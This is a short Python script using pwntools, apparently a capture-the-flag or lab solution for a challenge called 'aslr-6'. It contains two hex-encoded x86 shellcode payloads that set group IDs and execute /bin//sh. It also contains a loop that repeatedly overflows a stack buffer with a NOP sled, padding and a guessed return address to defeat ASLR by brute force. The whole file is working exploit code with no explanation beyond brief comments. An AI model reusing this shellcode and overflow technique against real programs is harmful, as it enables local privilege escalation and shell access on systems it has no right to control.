from pwn import *

SHELLCODE ='\xb8\xca\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x80\x89\xc3\x89\xc1\xb8\xcc\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x801\xc0Phn/shh//bi\x89\xe31\xc91\xd2\xb8\x1b\x11\x11\x11\xc1\xe0\x1c\xc1\xe8\x1c\xcd\x80'

# Shorter, and a nop sled
SHELLCODE2 = '\x90\x90\x90\x90\xb8\xca\x00\x00\x00\xcd\x80\x89\xc3\x89\xc1\xb8\xcc\x00\x00\x00\xcd\x801\xc9\x89\xcaQhn/shh//bi\x89\xe3j\x0bX\xcd\x80'

ARG1 = ''
ENV = {}

# Keep guessing the buffer address, eventually you will get it right.
while True:
    p = process(["aslr-6", ARG1], env=ENV)

    data = p.recvuntil("name: \n")

    # Send an address that used to be the start of the buffer and hope that it is again.
    p.sendline(SHELLCODE2 + ('a' * (0x88-len(SHELLCODE2))) + 'aaaa' + p32(0xbf940f70))
    p.interactive()
